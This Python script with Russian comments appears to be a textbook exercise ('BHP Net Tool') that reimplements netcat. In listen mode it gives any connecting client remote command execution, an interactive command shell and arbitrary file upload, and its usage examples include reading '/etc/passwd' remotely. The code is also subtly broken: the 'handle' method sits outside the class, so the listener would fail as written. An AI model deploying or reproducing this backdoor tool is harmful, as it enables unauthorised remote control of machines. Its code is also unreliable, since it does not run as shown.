import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


class NetCat:
    def __init__(self, args, buffer=None):  # Мы инициализируем объект NetCat с помощью аргументов из командной
        # строки и буфера
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаем объект сокета
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:  # чтобы получить данные от целевого сервера
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:  # Цикл будет работать, пока не произойдет исключение KeyboardInterrupt
            # (Ctrl+C), в результате чего закроется сокет.
            print('User terminated.')
            self.socket.close()
            sys.exit()

    # метод, который выполняется, когда программа запускается для прослушивания
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()


# Метод handle выполняет команду, загружает файл или запускает командную оболочку. Если нужно выполнить команду
# , метод handle передает ее функции execute и шлет вывод обратно в сокет
def handle(self, client_socket):
    if self.args.execute:
        output = execute(self.args.execute)
        client_socket.send(output.encode())

    elif self.args.upload:
        file_buffer = b''
        while True:
            data = client_socket.recv(4096)
            if data:
                file_buffer += data
            else:
                break

        with open(self.args.upload, 'wb') as f:
            f.write(file_buffer)
        message = f'Saved file {self.args.upload}'
        client_socket.send(message.encode())

    elif self.args.command:
        cmd_buffer = b''
        while True:
            try:
                client_socket.send(b'BHP: #> ')
                while '\n' not in cmd_buffer.decode():
                    cmd_buffer += client_socket.recv(64)
                response = execute(cmd_buffer.decode())
                if response:
                    client_socket.send(response.encode())
                cmd_buffer = b''
            except Exception as e:
                print(f'server filled {e}')
                self.socket.close()
                sys.exit()


def execute(cmd):
    cmd = cmd.strip()
    print(cmd)
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)  # check_output выполняет команду в
    # локальной операционной системе
    print(output)
    return output.decode()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(  # Для создания интерфейса командной строки модуль argparse
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
            '''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command wrapper
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
            # load file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
            #perfoming command...
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
            #text for server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connecting..''')
    )
    parser.add_argument('-c', '--command', action='store_true', help='command shell')  # -c подготавливает
    # интерактивную
    # командную оболочку
    parser.add_argument('-e', '--execute', help='execute specified command')  # -e выполняет отдельно
    # взятую команду
    parser.add_argument('-l', '--listen', action='store_true',
                        help='listen')  # -l говорит о том, что нужно подготовить слушателя
    parser.add_argument('-p', '--port', type=int, default=5555,
                        help='specified port')  # -p позволяет указать порт, на котором будет происходить
    # взаимодействие
    parser.add_argument('-t', '--target', default='192.163.1.203', help='specified IP')  # -t задает IP-адрес
    parser.add_argument('-u', '--upload', help='upload file')  # -u определяет имя файла, который нужно загрузить
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()
